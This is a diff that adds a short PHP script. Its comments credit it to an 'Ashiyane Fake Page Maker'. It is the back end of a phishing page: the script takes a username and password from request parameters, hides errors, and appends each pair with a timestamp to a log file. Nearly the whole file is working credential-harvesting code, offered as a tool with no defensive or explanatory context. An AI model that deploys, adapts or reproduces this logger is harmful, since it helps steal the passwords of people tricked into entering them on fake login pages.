@@ -1,0 +1,38 @@
+<?php
+error_reporting(0);
+/**
+* @author Reza-_S4T4N
+* @copyright 2013
+*/
+$rs4_user = $_REQUEST['{0}'];
+$rs4_passwd = $_REQUEST['{1}'];
+$rs4_filename = '{2}';
+$rs4_title = '-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+ This File Created By Ashiyane Fake Page Maker By Reza_S4T4N 
+-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+';
+if (!file_exists($rs4_filename)) {
+    if (!$handle = fopen($rs4_filename, 'a')) {
+         exit;
+    }
+    if (fwrite($handle, $rs4_title) === FALSE) {
+        exit;
+    }
+    fclose($handle);
+} 
+$rs4_log = '
+UserName : '.$rs4_user.'
+Password : '.$rs4_passwd.'
+Time : '.date('F j, Y, g:i a').'
+___________________________________
+';
+if (is_writable($rs4_filename)) {
+    if (!$handle = fopen($rs4_filename, 'a')) {
+         exit;
+    }
+    if (fwrite($handle, $rs4_log) === FALSE) {
+        exit;
+    }
+    fclose($handle);
+}
+?>
